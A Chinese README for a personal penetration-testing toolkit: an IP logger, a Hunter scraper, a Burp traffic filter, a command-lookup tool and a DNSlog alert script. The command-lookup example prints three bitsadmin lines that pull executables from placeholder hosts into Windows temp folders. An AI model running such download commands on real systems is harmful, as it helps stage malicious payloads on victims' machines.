# 渗透测试小工具集

## getip 

> 记录自己平时做渗透的出口IP

没别的说的，就是记录一下自己平时的IP

## attacktop

> 攻击者IP次数统计


- 在看golang，顺手就把之前的一些python改成golang了。
- 这工具有个好处就在于统计出现次数，虽然Excel其实可以做得很好，但好多时候我连Excel都难得打开。把这工具添加环境变量，直接一条命令解决。

## hunters

> 奇安信全球鹰爬虫工具

网上其实关于hunter的爬虫工具非常多，但不知道为啥总冥冥之中觉得不适合自己，所以造了这个轮子。

功能大体跟别的相似，并且只支持hunter，原因是fofa有ehole、360可以直接导出。我费那个劲集成在一起干啥，并且这些工具其实人家都做得挺不错。

❎ 计划后头写成图形化的，别问为啥，有些时候命令行总觉得缺了点啥（单纯个人觉得）

## WebFilter

> 抓包过滤无意义网站

Burpsuite代理的时候可以使用这部分过滤非常多的垃圾网站（包含一部分互联网企业，如果挖掘src的需要自行研判了）以此减轻BurpSuite被动扫描的压力。


## Fs

> 快速命令检索工具

年龄大了？记忆不好？就用fs

代码很简洁，需要自己简单修改下代码，没有很好做好适配。

把你常用且又爱忘记的一些命令放到use.log里，然后通过执行Linux命令来检索。

那么你只需要编译好这个工具以后直接fs admin，就可以检索admin相关的信息出来。

如下所示：

```bash
➜  ~ fs bitsadmin
-+====================================+-
   181  ➜  windows download[+]:bitsadmin /rawreturn /transfer getfile http://x.x.x.x:8888/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
   183  ➜  windows download[+]:bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/z.exe" c:\\z.exe
   259  ➜  bitsadmin /rawreturn /transfer getfile http://x.x.x.x/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
-+====================================+-
```

不折不扣的懒人必备！

PS：之前有小伙伴问为什么不用命令行的那个提示符，那个感觉还是有点瑕疵，也就是你必须要记得前面字符，才会提示后面字符，而有时候是记得中间字符并不记得前面字符。

## s
> 漏洞检索
指定路径检索文件（主要用于代码，懒得连编辑器都不想打开）

## ceyes

> Ceyes dnslog告警提示

起因：早之前一直使用低版本的BurpSuite1.7.33，奈何在低版本中logger插件动不动就卡死啥的。

使用了高版本bp后，心想这个问题就解决了。

没想到....昨天一堆log4j的告警，而我在logger里死活搜索不到。

所以。。。。就有了这个小脚本。

可以自己加定时任务，自动检索然后产生告警，还是舒服的。

🤔 待添加功能

❎ 日志记录

❎ 将所需配置项写到JSON内读取